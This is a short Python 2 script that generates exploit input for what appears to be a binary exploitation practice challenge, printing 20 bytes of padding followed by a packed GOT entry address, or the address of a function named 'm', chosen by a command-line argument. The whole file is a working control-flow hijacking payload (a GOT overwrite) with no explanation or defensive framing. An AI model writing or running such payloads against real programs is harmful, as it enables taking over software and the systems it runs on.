import struct
import sys
GOT_target = struct.pack('I', 0x08049928)  
address_of_m = struct.pack('I', 0x80484f4)
val = int(sys.argv[1])
if val == 1:
    print 'A' * 20 + GOT_target
elif val == 2:
    print address_of_m
else:
    print None
